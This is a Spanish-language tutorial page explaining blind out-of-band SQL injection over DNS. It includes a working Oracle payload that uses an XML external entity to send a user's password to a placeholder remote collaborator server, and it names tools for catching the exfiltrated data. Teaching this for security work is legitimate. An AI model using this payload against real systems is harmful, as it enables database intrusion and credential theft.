---
layout: default
title: 4.4 Fuera de banda
permalink: /injection_types/blind/oob_type
nav_order: 4
parent: 4. Inyecciones ciegas
has_children: true
---

# Inyecciones ciegas con interacción fuera de banda

Para realizar una inyección SQL ciega fuera de banda, el atacante debe utilizar una técnica que permita a la aplicación enviar la información  consultada a través de un canal diferente al utilizado para la interacción con la base de datos. Por ejemplo, el atacante puede utilizar comandos SQL que envíen información a través de una conexión de red, una solicitud DNS o una solicitud HTTP. Una vez que el atacante ha enviado la inyección, puede esperar a recibir la respuesta de la base de datos en el canal alternativo utilizado.

Continuando con nuestro ejemplo anterior, apliquemos una inyección SQL fuera de banda, utilizando el protocolo DNS. Este es usado comúnmente ya que muchas redes permiten salida libre de consultas DNS, debido a su importancia en el funcionamiento de los sistemas de producción. Para construir la consulta nos apoyaremos en la [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/blind).

Si detectamos un parametro vulnerable en la consulta hacia la aplicación, podemos jugar con la consulta para que, la respuesta a la consulta inyectada pueda ser recibida a traves de nuestro servidor remoto colaborador en forma de una consulta DNS, estos comandos son especificos para cada tipo de base de datos, nuestro ejemplo se  centra en una base de datos **Oracle**

`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT+password+FROM+users+WHERE+username='USER')||'.SERVIDOR-REMOTO-COLABORADOR/"> %remote;]>'),'/l') FROM dual--`

Para estas tareas podemos utilizar  herramientas como [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator) este nos permitira  traves de su cliente local hacer uso de un servicio DNS publicado a internet y obtener un subdominio que podremos utilizar para la inyeccion fuera de banda, Este se encuentra disponible junto con la licencia de Burpsuite Professional, una alternativa gratuita puede ser [Interactsh](https://github.com/projectdiscovery/interactsh).

  